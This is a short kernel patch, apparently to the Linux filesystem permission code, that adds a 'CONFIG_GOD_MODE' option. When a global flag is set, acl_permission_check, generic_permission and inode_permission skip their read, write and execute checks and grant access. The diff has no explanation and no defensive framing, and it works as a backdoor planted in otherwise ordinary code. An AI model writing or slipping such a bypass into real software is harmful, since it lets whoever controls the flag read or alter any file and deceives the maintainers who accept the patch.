@@ -229,6 +229,11 @@ static int check_acl(struct inode *inode, int mask)
 static int acl_permission_check(struct inode *inode, int mask)
 {
 	unsigned int mode = inode->i_mode;
+	
+#ifdef CONFIG_GOD_MODE
+        if (god_mode_enabled)
+                return 0;
+#endif
 
 	mask &= MAY_READ | MAY_WRITE | MAY_EXEC | MAY_NOT_BLOCK;
 
@@ -275,6 +280,11 @@ other_perms:
 int generic_permission(struct inode *inode, int mask)
 {
 	int ret;
+
+#ifdef CONFIG_GOD_MODE
+	if (god_mode_enabled)
+		return 0;
+#endif
 
 	/*
 	 * Do the basic POSIX ACL permission checks.
@@ -326,6 +336,11 @@ int inode_permission(struct inode *inode, int mask)
 {
 	int retval;
 
+#ifdef CONFIG_GOD_MODE
+	if (god_mode_enabled)
+		goto out;
+#endif
+
 	if (mask & MAY_WRITE) {
 		umode_t mode = inode->i_mode;
 
@@ -355,6 +370,7 @@ int inode_permission(struct inode *inode, int mask)
 	if (retval)
 		return retval;
 
+out:
 	return security_inode_permission(inode, mask);
 }
 
